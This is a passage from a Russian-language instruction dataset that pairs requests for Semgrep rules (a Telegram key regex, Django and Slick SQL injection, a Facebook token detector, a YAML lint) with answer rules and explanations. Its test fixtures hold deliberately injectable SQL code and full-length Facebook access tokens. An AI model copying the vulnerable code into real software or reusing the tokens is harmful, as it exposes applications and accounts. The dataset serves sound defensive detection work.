    "output": "rules:\n- id: detected-telegram-bot-api-key\n  patterns:\n  - pattern-regex: '[0-9]+:AA[0-9A-Za-z\\-_]{33}'\n  - pattern-not-regex: go\\.mod.*\n  - pattern-not-regex: v[\\d]+\\.[\\d]+\\.[\\d]+.*\n  languages:\n  - regex\n  message: Telegram Bot API Key detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json\n    category: security\n    technology:\n    - secrets\n    - telegram\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, соответствующих формату Telegram Bot API ключа, который обычно имеет вид [число]:AA[буквы-и-цифры]{33}. Правило исключает совпадения внутри файлов go.mod и версий пакетов, помечая их как безопасные. Также исключаются строки, содержащие версию пакета в формате v[X].[X].[X].\n\n# Ключевые элементы:\n- ID: detected-telegram-bot-api-key\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-telegram-bot-api-key",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения sql-injection-using-raw\nОписание уязвимости: Data that is possible user-controlled from a python request is passed to `raw()`. This could lead to SQL injection and attackers gaining access to protected information. Instead, use django's QuerySets, which are built with query parameterization and therefore not vulnerable to sql injection. For example, you could use `Entry.objects.filter(date=2006)`.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: sql-injection-using-raw.py\nfrom django.http import HttpResponse\n\nclass Person(models.Model):\n    first_name = models.CharField(...)\n    last_name = models.CharField(...)\n    birth_date = models.DateField(...)\n\n##### raw() True Positives #########\ndef get_user_age(request):\n  # ruleid: sql-injection-using-raw\n  user_name = request.get('user_name')\n  user_age = Person.objects.raw('SELECT user_age FROM myapp_person where user_name = %s' % user_name)\n  html = \"<html><body>User Age %s.</body></html>\" % user_age\n  return HttpResponse(html)\n\ndef get_user_age(request):\n  # ruleid: sql-injection-using-raw\n  user_name = request.get('user_name')\n  user_age = Person.objects.raw(f\"SELECT user_age FROM myapp_person where user_name = {user_name}\")\n  html = \"<html><body>User Age %s.</body></html>\" % user_age\n  return HttpResponse(html)\n\ndef get_user_age(request):\n  # ruleid: sql-injection-using-raw\n  user_name = request.get('user_name')\n  user_age = Person.objects.raw('SELECT user_age FROM myapp_person where user_name = %s'.format(user_name))\n  html = \"<html><body>User Age %s.</body></html>\" % user_age\n  return HttpResponse(html)\n\ndef get_users(request):\n  # ruleid: sql-injection-using-raw\n  client_id = request.headers.get('client_id')\n  users = Person.objects.raw('SELECT * FROM myapp_person where client_id = %s' % client_id)\n  html = \"<html><body>Users %s.</body></html>\" % users\n  return HttpResponse(html)\n\ndef get_users(request):\n  # ruleid: sql-injection-using-raw\n  client_id = request.headers.get('client_id')\n  users = Person.objects.raw(f'SELECT * FROM myapp_person where client_id = {client_id}')\n  html = \"<html><body>Users %s.</body></html>\" % users\n  return HttpResponse(html)\n\n##### raw() True Negatives #########\ndef get_user_age(request):\n  user_name = request.get('user_name')\n  # django queryset is good\n  user_age = Person.objects.filter(user_name=user_name).first()\n  html = \"<html><body>User Age %s.</body></html>\" % user_age\n  return HttpResponse(html)\n\ndef get_u  # Ограничиваем длину\n\nОпасные паттерны:\n• user_name = request.get('user_name')\nuser_age = Person.objects.raw('SELECT user_age FROM myapp_person where user_name = %s' % user_name)\n• client_id = request.headers.get('client_id')\nusers = Person.objects.raw('SELECT * FROM myapp_person where client_id = %s' % client_id)\n• user_name = request.get('user_name')\nperson_age = Person.objects.raw(f\"SELECT user_age FROM myapp_person where user_name = {user_name}\")\n\nБезопасные паттерны:  \n• user_name = request.get('user_name')\nuage = Person.objects.filter(user_name=user_name).first()\n• client_id = request.headers.get('client_id')\nusers = Person.objects.raw('SELECT * FROM myapp_person where client_id = %s', (client_id,))\n• user_name = request.get('user_name')\nPerson.objects.raw('SELECT * FROM myapp_person where user_name = %s', (user_name,))\n\nЛегенда аннотаций:\n- // ruleid:sql-injection-using-raw: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sql-injection-using-raw: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sql-injection-using-raw\n  message: Data that is possible user-controlled from a python request is passed to `raw()`. This could\n    lead to SQL injection and attackers gaining access to protected information. Instead, use django's\n    QuerySets, which are built with query parameterization and therefore not vulnerable to sql injection.\n    For example, you could use `Entry.objects.filter(date=2006)`.\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.djangoproject.com/en/3.0/topics/security/#sql-injection-protection\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n  - pattern-either:\n    - pattern: $MODEL.objects.raw(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: $MODEL.objects.raw(..., $S % request.$W.get(...), ...)\n    - pattern: $MODEL.objects.raw(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: $MODEL.objects.raw(..., request.$W.get(...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $MODEL.objects.raw(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $MODEL.objects.raw(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $MODEL.objects.raw(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $MODEL.objects.raw(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $MODEL.objects.raw(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: $A = $MODEL.objects.raw(..., request.$W.get(...), ...)\n    - pattern: return $MODEL.objects.raw(..., request.$W.get(...), ...)\n    - pattern: $MODEL.objects.raw(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: $MODEL.objects.raw(..., $S % request.$W(...), ...)\n    - pattern: $MODEL.objects.raw(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: $MODEL.objects.raw(..., request.$W(...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $MODEL.objects.raw(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $MODEL.objects.raw(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $MODEL.objects.raw(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $MODEL.objects.raw(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $MODEL.objects.raw(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: $A = $MODEL.objects.raw(..., request.$W(...), ...)\n    - pattern: return $MODEL.objects.raw(..., request.$W(...), ...)\n    - pattern: $MODEL.objects.raw(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: $MODEL.objects.raw(..., $S % request.$W[...], ...)\n    - pattern: $MODEL.objects.raw(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: $MODEL.objects.raw(..., request.$W[...], ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $MODEL.objects.raw(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $MODEL.objects.raw(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $MODEL.objects.raw(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $MODEL.objects.raw(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $MODEL.objects.raw(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: $A = $MODEL.objects.raw(..., request.$W[...], ...)\n    - pattern: return $MODEL.objects.raw(..., request.$W[...], ...)\n    - pattern: $MODEL.objects.raw(..., $S.format(..., request.$W, ...), ...)\n    - pattern: $MODEL.objects.raw(..., $S % request.$W, ...)\n    - pattern: $MODEL.objects.raw(..., f\"...{request.$W}...\", ...)\n    - pattern: $MODEL.objects.raw(..., request.$W, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $MODEL.objects.raw(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $MODEL.objects.raw(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $MODEL.objects.raw(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $MODEL.objects.raw(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $MODEL.objects.raw(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $MODEL.objects.raw(..., $INTERM, ...)\n    - pattern: $A = $MODEL.objects.raw(..., request.$W, ...)\n    - pattern: return $MODEL.objects.raw(..., request.$W, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $MODEL.objects.raw($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $MODEL.objects.raw($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $MODEL.objects.raw($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $MODEL.objects.raw($STR % (..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $MODEL.objects.raw($INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $MODEL.objects.raw($INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $MODEL.objects.raw($INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % (..., $DATA, ...)\n        ...\n        $MODEL.objects.raw($INTERM, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SQL-инъекции, вызванных использованием метода raw() в Django ORM без параметризованных запросов. Правило проверяет наличие вызовов метода raw(), где строка запроса формируется динамически на основе пользовательского ввода, полученного через request.get(...) или request.headers.get(...). Это может привести к инъекции SQL-кода злоумышленником. Безопасным подходом является использование параметризированных запросов через методы filter() или предоставление списка параметров для raw().\n\n# Ключевые элементы:\n- ID: sql-injection-using-raw\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "sql-injection-using-raw",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения tainted-slick-sqli\nОписание уязвимости: Detected a tainted SQL statement. This could lead to SQL injection if variables in the SQL statement are not properly sanitized. Avoid using using user input for generating SQL strings.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: scala\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-slick-sqli.scala\npackage controllers\n\nimport play.api.mvc._\nimport javax.inject._\nimport slick.jdbc.H2Profile.api._\nimport models.UserModel\n\n@Singleton\nclass HomeController @Inject()(val controllerComponents: ControllerComponents) extends BaseController{\n  val db = Database.forConfig(\"h2mem1\")\n\n  def oneAction() = Action { implicit request: Request[AnyContent] =>\n    val bodyVals = request.body.asFormUrlEncoded\n    val smth = bodyVals.get(\"username\").head\n    // ruleid: tainted-slick-sqli\n    val action = sql\"select ID, NAME, AGE from #$smth\".as[(Int,String,Int)]\n    db.run(action)\n    Ok(\"ok\")\n  }\n\n  def twoAction(name: String) = Action {\n    val people = TableQuery[People]\n\n    // ruleid: tainted-slick-sqli\n    people.map(p => (p.id,p.name,p.age)).result.overrideSql(s\"SELECT id, name, age FROM Person WHERE $name\")\n\n    Ok(\"ok\")\n  }\n\n  def threeAction(name: String) = Action.async(parse.json) {\n    val people = TableQuery[People]\n\n    // ruleid: tainted-slick-sqli\n    people.map(p => (p.id,p.name,p.age)).result.overrideSql(s\"SELECT id, name, age FROM Person WHERE $name\")\n\n    Ok(\"ok\")\n  }\n\n  def helloWorldPage() = Action { implicit request: Request[AnyContent] =>\n    // ok: tainted-slick-sqli\n    Ok(views.html.helloWorld())\n  }\n\n  def okAction1() = Action { implicit request: Request[AnyContent] =>\n    val smth = \"hardcoded_value\"\n    // ok: tainted-slick-sqli\n    val action = sql\"select ID, NAME, AGE from #$smth\".as[(Int,String,Int)]\n    db.run(action)\n    Ok(\"ok\")\n  }\n\n  def okAction2(name: String) = Action { implicit request: Request[AnyContent] =>\n    val people = TableQuery[People]\n\n    people.map(p => (p.id,p.name,p.age))\n      .result\n      // ok: tainted-slick-sqli\n      .overrideSql(s\"SELECT id, name, age FROM Person WHERE name = 'FooBar'\")\n\n    Ok(\"ok\")\n  }\n\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• val smth = bodyVals.get(\"username\").head\nval action = sql\"select ID, NAME, AGE from #$smth\".as[(Int,String,Int)]\n• people.map(p => (p.id,p.name,p.age)).result.overrideSql(s\"SELECT id, name, age FROM Person WHERE $name\")\n• people.map(p => (p.id,p.name,p.age)).result.overrideSql(s\"SELECT id, name, age FROM Person WHERE $name\")\n\nБезопасные паттерны:  \n• Ok(views.html.helloWorld())\n• val smth = \"hardcoded_value\"\nval action = sql\"select ID, NAME, AGE from #$smth\".as[(Int,String,Int)]\n• people.map(p => (p.id,p.name,p.age)).result.overrideSql(s\"SELECT id, name, age FROM Person WHERE name = 'FooBar'\")\n\nЛегенда аннотаций:\n- // ruleid:tainted-slick-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-slick-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-slick-sqli\n  mode: taint\n  metadata:\n    references:\n    - https://scala-slick.org/doc/3.3.3/sql.html#splicing-literal-values\n    - https://scala-slick.org/doc/3.2.0/sql-to-slick.html#non-optimal-sql-code\n    category: security\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    technology:\n    - scala\n    - slick\n    - play\n    confidence: HIGH\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n  message: >-\n    Detected a tainted SQL statement. This could lead to SQL\n    injection if variables in the SQL statement are not properly sanitized.\n    Avoid using using user input for generating SQL strings.\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern: $REQ\n        - pattern-either:\n          - pattern-inside: |\n              Action {\n                $REQ: Request[$T] => \n                  ...\n              }\n          - pattern-inside: |\n              Action(...) {\n                $REQ: Request[$T] => \n                  ...\n              }\n          - pattern-inside: |\n              Action.async {\n                $REQ: Request[$T] => \n                  ...\n              }\n          - pattern-inside: |\n              Action.async(...) {\n                $REQ: Request[$T] => \n                  ...\n              }\n      - patterns:\n        - pattern: $PARAM\n        - pattern-either:\n          - pattern-inside: |\n              def $CTRL(..., $PARAM: $TYPE, ...) = Action {\n                ...\n              }\n          - pattern-inside: |\n              def $CTRL(..., $PARAM: $TYPE, ...) = Action(...) {\n                ...\n              }\n          - pattern-inside: |\n              def $CTRL(..., $PARAM: $TYPE, ...) = Action.async {\n                ...\n              }\n          - pattern-inside: |\n              def $CTRL(..., $PARAM: $TYPE, ...) = Action.async(...) {\n                ...\n              }\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $MODEL.overrideSql(...)\n      - pattern: sql\"...\"\n    - pattern-inside: |\n        import slick.$DEPS\n        ...\n  severity: ERROR\n  languages:\n  - scala\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциально опасных SQL запросов, которые могут быть подвержены инъекциям SQL. Источники (sources) определяют места, откуда может поступать загрязненный (tainted) ввод пользователя, а синки (sinks) указывают на возможные точки выполнения SQL-запросов. Правило использует шаблон сопоставления, который ищет методы Action в Scala, принимающие параметр запроса ($REQ), и проверяет наличие параметра ($PARAM), используемого в SQL запросе без надлежащей очистки. Это позволяет обнаружить случаи, когда пользовательский ввод напрямую включается в SQL-запрос, что является потенциальной угрозой SQL-инъекции.\n\n# Ключевые элементы:\n- ID: tainted-slick-sqli\n- Язык: scala \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-slick-sqli",
      "language": "scala",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: missing-message-field\nОписание уязвимости: This rule does not have a message. Semgrep requires that rules have a message. Include a message to explain what the rule does. Consider writing a message that explains why this is an issue and how to fix it.\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-message-field.test.yaml\nrules:\n  # ruleid: missing-message-field\n  - id: unchecked-subprocess-call\n    patterns:\n      - pattern: |\n          subprocess.call(...)\n      - pattern-not-inside: |\n          $S = subprocess.call(...)\n      - pattern-not-inside: |\n          subprocess.call(...) == $X\n    severity: WARNING\n    fix: subprocess.check_call(...)\n  # ok: missing-message-field\n  - id: other-rule\n    pattern: <div>hello</div>\n    languages: [generic]\n    severity: INFO\n    message: \"\"\n  # ok: missing-message-field\n  - message: \"\"\n    id: other-rule-2\n    pattern: <div>hello</div>\n    languages: [generic]\n    severity: INFO  # Ограничиваем длину\n\nОпасные паттерны:\n• rules:\\n  # ruleid: missing-message-field\\n  - id: unchecked-subprocess-call\\n    patterns:\\n      - pattern: |\\n          subprocess.call(...)\\n      - pattern-notinside: |\\n          $S = subprocess\n\nБезопасные паттерны:  \n• rules:\\n  - id: other-rule-2\\n    message: \\\n\nЛегенда аннотаций:\n- // ruleid:missing-message-field: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-message-field: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-message-field\n  message: >-\n    This rule does not have a message. Semgrep requires that rules have a message. Include a message to\n    explain what the rule does. Consider writing a message that explains why this is an issue and how\n    to fix it.\n  severity: WARNING\n  metadata:\n    category: correctness\n    technology:\n    - semgrep\n  languages: [yaml]\n  patterns:\n  - pattern-inside: 'rules: [..., $RULE, ...]'\n  - pattern: 'id: $RULEID'\n  - pattern-not-inside: |\n      - ...\n        message: ...\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска правил, которые не содержат сообщения (message). Анализ выполняется путем поиска ключевых слов 'rules:' и 'id:', а также проверки отсутствия сообщения внутри блока правил. Правило считается опасным, если сообщение отсутствует полностью или оно пустое ('message: \n\n# Ключевые элементы:\n- ID: missing-message-field\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-message-field",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detected-facebook-access-token\nОписание уязвимости: Facebook Access Token detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-facebook-access-token.txt\n# cf. https://github.com/nalzai35/Campuran/blob/f2d1974cd6f85281dc02a234cd9a89e69773164a/kitabfb.txt\n\n# ruleid: detected-facebook-access-token\nUser UID groub = https://graph.facebook.com/v2.8/218718188140085/members?access_token=EAACEdEose0cBAMF99BFdceBHS5UcaEPIDbhKT1nbE0DaulfIS8ZCJTHrkD6IxkfKZCObCHzUsHcdhBISYuv7L4oiylZCmNztRy6s9KBgmZBYbJxZBBk1Csjl8PXFnZA3rt5WwZB7dZCB9M04a6FI7XwCFXfNV4ZB76y6SjltVc4AP4gZDZD&pretty=0&fields=id&limit=1000&after=MzQxNDM1MTE2MjQ0Njk4\n\n# ruleid: detected-facebook-access-token\nUser UID comment = https://graph.facebook.com/v2.8/1513562778655613/comments?format=json&access_token=EAAAACZAVC6ygBAAvRshdD1iGP7VZAR4JMQxRhnViVIjzoIV3nCnZBejzSsCwCgRs5aZAAbBNI837xWZBnAMCRIdZADqjjpOtZAGBDgZBcUz5l7n0IqK53MKKcyeCIBZBIDVSkaqth983q5avmR2gq61ZBfHGPiGAa64IYZD\n\n# ruleid: detected-facebook-access-token\nUser UID likes = https://graph.facebook.com/v2.8/1513562778655613/likes?format=json&access_token=EAAAACZAVC6ygBAAvRshdD1iGP7VZAR4JMQxRhnViVIjzoIV3nCnZBejzSsCwCgRs5aZAAbBNI837xWZBnAMCRIdZADqjjpOtZAGBDgZBcUz5l7n0IqK53MKKcyeCIBZBIDVSkaqth983q5avmR2gq61ZBfHGPiGAa64IYZD\n\n# ruleid: detected-facebook-access-token\nUser UID Page likes = https://graph.facebook.com/v2.8/10154914419175179/likes?access_token=EAACEdEose0cBAIWHqjHI5o2auPWv3lPP3zNYuWWpjMrSaIFxbQeve3lsLOcas5k8GhC5HgOXnbF3rXRTczOpsbNjJW0CQL8LcQEMhZAWAJzI0AzmLriWuuZByFAia5aFl0Q4Xv4u2QVoAdH0mcJbZAHRpyJKIAyDKUEBzz0GgZDZD&pretty=0&fields=id&limit=25&after=OTA3MjI3ODI5Mjg4ODM4\n\n# cf. https://github.com/riedayme/FacebookKit/blob/243483d8b460bde792fc277a19e0c87175068a0d/explore/resource.txt\n-- feed facebook\n# ruleid: detected-facebook-access-token\nhttps://graph.facebook.com/me/home?fields=id&limit=1&access_token=EAAAAZAw4FxQIBAElafKg4s32XtMxE5POc9hAHgggZBSmkK0cRPkZBSTpKWGhjpz7snU8XItOqqQwWS02ZBN8NjcMwe9aZAoVoHa5gYNQUPWckb3JNzUMRCobPwpzJ817f3eh0FZCpzVmvv78VyMNGZB51iMQZA5pi05dShw2GWVrAgZDZD\n\n-- reaction\n# ruleid: detected-facebook-access-token\nhttps://graph.facebook.com/170611  # Ограничиваем длину\n\nОпасные паттерны:\n• User UID groub = https://graph.facebook.com/v2.8/218718188140085/members?access_token=EAACEdEose0cBAMF99BFdceBHS5UcaEPIDbhKT1nbE0DaulfIS8ZCJTHrkD6IxkfKZCObCHzUsHcdhBISYuv7L4oiylZCmNztRy6s9KBgmZBYbJxZB\n• User UID comment = https://graph.facebook.com/v2.8/1513562778655613/comments?format=json&access_token=EAAAACZAVC6ygBAAvRshdD1iGP7VZAR4JMQxRhnViVIjzoIV3nCnZBejzSsCwCgRs5aZAAbBNI837xWZBnAMCRIdZADqjjpOtZ\n• User UID likes = https://graph.facebook.com/v2.8/1513562778655613/likes?format=json&access_token=EAAAACZAVC6ygBAAvRshdD1iGP7VZAR4JMQxRhnViVIjzoIV3nCnZBejzSsCwCgRs5aZAAbBNI837xWZBnAMCRIdZADqjjpOtZAGBDg\n\nБезопасные паттерны:  \n• User UID groub = https://graph.facebook.com/v2.8/218718188140085/members?access_token=ACCESS_TOKEN&pretty=0&fields=id&limit=1000&after=MzQxNDM1MTE2MjQ0Njk4\n• User UID comment = https://graph.facebook.com/v2.8/1513562778655613/comments?format=json&access_token=ACCESS_TOKEN\n• User UID likes = https://graph.facebook.com/v2.8/1513562778655613/likes?format=json&access_token=ACCESS_TOKEN\n\nЛегенда аннотаций:\n- // ruleid:detected-facebook-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-facebook-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-facebook-access-token\n  pattern-either:\n  - pattern-regex: EAACEdEose0cBA[0-9A-Za-z]+\n  - pattern-regex: EAAAACZAVC6ygB[0-9A-Za-z]+\n  - pattern-regex: EAAAAZAw4[0-9A-Za-z]+\n  languages: [regex]\n  message: Facebook Access Token detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/grab/secret-scanner/blob/master/scanner/signatures/pattern.go\n    category: security\n    technology:\n    - secrets\n    - facebook\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов доступа Facebook в URL-адресах. Паттерны соответствуют различным форматам токенов, встречающимся в примерах кода. Правило применимо только к текстовым данным, соответствующим языку регулярных выражений.\n\n# Ключевые элементы:\n- ID: detected-facebook-access-token\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-facebook-access-token",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
